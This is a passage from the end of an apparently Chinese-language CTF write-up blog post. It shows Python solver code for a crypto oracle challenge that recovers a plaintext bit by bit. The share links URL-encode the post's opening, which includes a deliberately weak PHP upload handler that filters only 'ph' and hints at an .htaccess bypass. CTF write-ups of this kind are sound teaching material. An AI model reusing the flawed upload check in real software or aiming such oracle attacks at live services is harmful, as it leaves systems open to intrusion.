</span></span><span style=display:flex><span><span style=color:#75715e># highbit 都是 0 先跳過</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>1024</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>        lst<span style=color:#f92672>.</span>append(A)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        lst<span style=color:#f92672>.</span>append(lst[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>**</span> <span style=color:#ae81ff>2</span> <span style=color:#f92672>%</span> n)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> tqdm(range(<span style=color:#ae81ff>2048</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1024</span>))
</span></span><span style=display:flex><span>    <span style=color:#75715e># 一開始是問 c1, c2*pow(2,i,p2)%p2 但沒有必要模 p2</span>
</span></span><span style=display:flex><span>    lst<span style=color:#f92672>.</span>append( ask(c1, c2 <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1024</span>)) )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> Fraction(hint <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>1024</span>, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2048</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> lst[i]<span style=color:#f92672>*</span>lst[i]<span style=color:#f92672>%</span>n <span style=color:#f92672>!=</span> lst[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>]:
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>+=</span> M
</span></span><span style=display:flex><span>    M <span style=color:#f92672>*=</span> Fraction(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> s <span style=color:#f92672>in</span> range(<span style=color:#f92672>-</span><span style=color:#ae81ff>5</span>, <span style=color:#ae81ff>5</span>):
</span></span><span style=display:flex><span>    print(long_to_bytes(int(ans <span style=color:#f92672>+</span> s)))
</span></span></code></pre></td></tr></table></div></div><p><del>這題也是在 local test 發現這種美好的 code 會跑出答案很驚訝的一題</del></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>lst <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> tqdm(range(<span style=color:#ae81ff>2048</span>)):
</span></span><span style=display:flex><span>    lst<span style=color:#f92672>.</span>append( ask(c1, c2 <span style=color:#f92672>*</span> pow(<span style=color:#ae81ff>2</span>, i) ) )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>M <span style=color:#f92672>=</span> Fraction(p2, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ans <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>2048</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> lst[i]<span style=color:#f92672>*</span>lst[i]<span style=color:#f92672>%</span>n <span style=color:#f92672>!=</span> lst[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>]:
</span></span><span style=display:flex><span>        ans <span style=color:#f92672>+=</span> M
</span></span><span style=display:flex><span>    M <span style=color:#f92672>*=</span> Fraction(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(int(ans), flag)
</span></span><span style=display:flex><span>print(int(ans <span style=color:#f92672>-</span> flag))
</span></span><span style=display:flex><span>print(float(Fraction(ans, flag)))
</span></span></code></pre></td></tr></table></div></div></div></article><div class=blog-post-comments><div id=disqus_thread><script type=text/javascript>(function(){var t,e=document.createElement("script");e.type="text/javascript",e.async=!0,t="omeletwithoutegg",e.src="//"+t+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)})()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com/ class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div></div><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>Home</a></li><li><a href=/about/>About</a></li><li><a href=/posts/>Posts</a></li><li><a href=/resources/>Resources</a></li><li><a href=/search/>Search</a></li><li><a href=/tags/>Tags</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#web>Web</a><ul><li><a href=#gist>Gist</a><ul><li><a href=#problem>problem</a></li></ul></li></ul></li><li><a href=#pwn>pwn</a><ul><li><a href=#how2know_revenge>how2know_revenge</a></li></ul></li><li><a href=#crypto>crypto</a><ul><li><a href=#hex>HEX</a></li><li><a href=#lf3r>LF3R</a></li><li><a href=#popcnt>popcnt</a></li><li><a href=#el2dlog>el2dlog</a></li></ul></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&text=2023%20EOF%20quals" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&is_video=false&description=2023%20EOF%20quals" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=2023%20EOF%20quals&body=Check out this article: https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&title=2023%20EOF%20quals" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fomeletwithoutegg.github.io%2f2023%2f01%2f13%2f2023-eof-quals%2f&name=2023%20EOF%20quals&description=%3ch1%20id%3d%222023-eof-ctf-%e5%88%9d%e8%b3%bd%22%3e2023%20EOF%20CTF%20%e5%88%9d%e8%b3%bd%3c%2fh1%3e%0a%3cp%3e%e4%bf%ae%e4%ba%86%e8%a8%88%e7%ae%97%e6%a9%9f%e5%ae%89%e5%85%a8%ef%bc%8c%e7%84%b6%e5%be%8c%e6%9c%9f%e6%9c%ab%e8%80%83%e4%bc%bc%e4%b9%8e%e6%98%af%e5%8f%83%e5%8a%a0%20EOF%20CTF%20%e7%9a%84%e5%88%9d%e8%b3%bd%ef%bc%8c%e5%8f%a6%e5%a4%96%e9%82%84%e8%a6%81%e4%ba%a4%20writeup%e3%80%82%3cbr%3e%0a%e6%8a%8a%e6%88%91%e5%af%ab%e7%9a%84%e9%83%a8%e4%bb%bd%e6%94%be%e5%9c%a8%e6%88%91%e7%9a%84%20blog%20%e4%b8%8a%e6%b0%b4%e6%96%87%e7%ab%a0%ef%bc%88%ef%bc%9f%ef%bc%89%3cbr%3e%0a%e4%b8%8b%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e5%b8%8c%e6%9c%9b%e6%98%af%e5%a4%a7%e4%ba%8c%e4%b8%8a%e7%9a%84%e4%bf%ae%e8%aa%b2%e5%bf%83%e5%be%97%ef%bc%8c%e5%86%8d%e4%b8%8d%e5%af%ab%e5%b0%b1%e8%a6%81%e5%bf%98%e5%85%89%e4%ba%86%e3%80%82%3c%2fp%3e%0a%3ch2%20id%3d%22web%22%3eWeb%3c%2fh2%3e%0a%3ch3%20id%3d%22gist%22%3eGist%3c%2fh3%3e%0a%3ch4%20id%3d%22problem%22%3eproblem%3c%2fh4%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cdiv%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%0a%3ctable%20style%3d%22border-spacing%3a0%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%3ctr%3e%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%201%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%202%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%203%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%204%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%205%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%206%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%207%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%208%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e%209%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e10%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e11%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e12%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e13%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e14%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e15%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e16%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e17%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e18%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e19%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e20%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e21%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e22%0a%3c%2fspan%3e%3cspan%20style%3d%22white-space%3apre%3b-webkit-user-select%3anone%3buser-select%3anone%3bmargin-right%3a0.4em%3bpadding%3a0%200.4em%200%200.4em%3bcolor%3a%237f7f7f%22%3e23%0a%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%0a%3ctd%20style%3d%22vertical-align%3atop%3bpadding%3a0%3bmargin%3a0%3bborder%3a0%3b%3bwidth%3a100%25%22%3e%0a%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%20class%3d%22language-php%22%20data-lang%3d%22php%22%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e%26lt%3b%3f%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3ephp%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3eisset%3c%2fspan%3e%28%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bfile%26%2339%3b%3c%2fspan%3e%5d%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24file%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bfile%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3epreg_match%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2fph%2fi%26%2339%3b%3c%2fspan%3e%2c%20%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%21%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%7c%7c%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3epreg_match%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2fph%2fi%26%2339%3b%3c%2fspan%3e%2c%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3efile_get_contents%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%29%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%21%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%7c%7c%3c%2fspan%3e%20%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bsize%26%2339%3b%3c%2fspan%3e%5d%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26gt%3b%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23ae81ff%22%3e0x100%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%29%7b%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3edie%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bBad%20file%21%26%2334%3b%3c%2fspan%3e%29%3b%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24uploadpath%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3emd5_file%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%29%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3emkdir%3c%2fspan%3e%28%24uploadpath%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3emove_uploaded_file%3c%2fspan%3e%28%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%2c%20%24uploadpath%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eHeader%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bLocation%3a%20%26%2334%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24uploadpath%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24file%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3edie%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bUpload%20success%21%26%2334%3b%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3ehighlight_file%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%2366d9ef%22%3e__FILE__%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3f%26gt%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%26lt%3bform%20method%3dPOST%20enctype%3dmultipart%2fform-data%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%20%20%26lt%3binput%20type%3dfile%20name%3dfile%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%20%20%26lt%3binput%20type%3dsubmit%20value%3dUpload%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%23960050%3bbackground-color%3a%231e0010%22%3e%26lt%3b%2fform%26gt%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3c%2fcode%3e%3c%2fpre%3e%3c%2ftd%3e%3c%2ftr%3e%3c%2ftable%3e%0a%3c%2fdiv%3e%0a%3c%2fdiv%3e%3cp%3e%e9%a1%8c%e7%9b%ae%e6%98%af%e6%9c%89%e4%b8%80%e5%80%8b%e7%b0%a1%e5%96%ae%e7%9a%84%20php%20%e7%b6%b2%e7%ab%99%e5%8f%af%e4%bb%a5%e4%b8%8a%e5%82%b3%e4%bb%bb%e6%84%8f%e6%aa%94%e6%a1%88%ef%bc%8c%e5%8f%aa%e8%a6%81%e6%aa%94%e5%90%8d%e5%92%8c%e5%85%a7%e5%ae%b9%e4%b8%8d%e5%8c%85%e5%90%ab%20%3ccode%3eph%3c%2fcode%3e%20%e5%b0%b1%e5%8f%af%e4%bb%a5%e4%b8%8a%e5%82%b3%ef%bc%8c%e6%9c%83%e8%a2%ab%e6%94%be%e5%88%b0%20%3ccode%3e%2fvar%2fwww%2fhtml%2fupload%2f%7bsomerandomstring%7d%2f%3c%2fcode%3e%20%e8%a3%a1%e9%9d%a2%ef%bc%88%e5%8f%af%e4%bb%a5%e7%94%a8%20%3ccode%3e%2fupload%2f%7bsomerandomstring%7d%2f%3c%2fcode%3e%20%e5%8e%bb%20access%20%e8%a9%b2%e8%b3%87%e6%96%99%e5%a4%be%ef%bc%89%e3%80%82%3cbr%3e%0a%e9%a6%96%e5%85%88%e7%ac%ac%e4%b8%80%e6%ad%a5%e5%b0%b1%e6%98%af%e7%9c%8b%e8%83%8c%e5%be%8c%e7%9a%84%20HTTP%20%e4%bc%ba%e6%9c%8d%e5%99%a8%e6%98%af%e8%aa%b0%ef%bc%8c%e9%9a%a8%e4%be%bf%e6%88%b3%e5%80%8b%20404%20%e5%8f%af%e4%bb%a5%e5%be%97%e7%9f%a5%e6%98%af%20Apache%ef%bc%8c%e9%82%a3%e5%b0%b1%e8%81%af%e6%83%b3%e5%88%b0%20%3ccode%3e.htaccess%3c%2fcode%3e%ef%bc%8c%e5%8e%bb%20google%20%e4%b9%8b%e5%be%8c%e5%be%97%e7%9f%a5%e5%8f%af%e4%bb%a5%e7%94%a8%20%3cco